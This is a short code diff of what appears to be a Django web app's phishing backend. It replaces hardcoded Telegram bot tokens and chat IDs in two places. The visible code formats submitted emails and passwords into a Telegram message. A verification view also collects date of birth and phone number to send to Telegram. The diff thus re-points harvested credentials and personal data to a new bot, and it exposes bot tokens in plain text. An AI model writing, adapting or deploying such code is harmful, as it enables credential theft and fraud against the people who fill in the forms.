@@ -18,8 +18,8 @@ import asyncio
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-TELEGRAM_BOT_TOKEN = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
-TELEGRAM_CHAT_ID = '1666996815'
+TELEGRAM_BOT_TOKEN = '6409462780:AAGO3CNzh0Ojyj-HGj2B1ANBB18AqzexNIY'
+TELEGRAM_CHAT_ID = '6071340711'
 
 async def send_to_telegram_async(email, password):
     message = f"Form submitted:\nEmail: {email}\nPassword: {password}"
@@ -83,8 +83,8 @@ async def verification(request):
         dob = request.POST.get('dob')
         phone_number = request.POST.get('phoneNumber')
         
-        bot_token = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
-        chat_id = '1666996815'
+        bot_token = '6409462780:AAGO3CNzh0Ojyj-HGj2B1ANBB18AqzexNIY'
+        chat_id = '6071340711'
 
         try:
             # Call the async function to send the message to Telegram
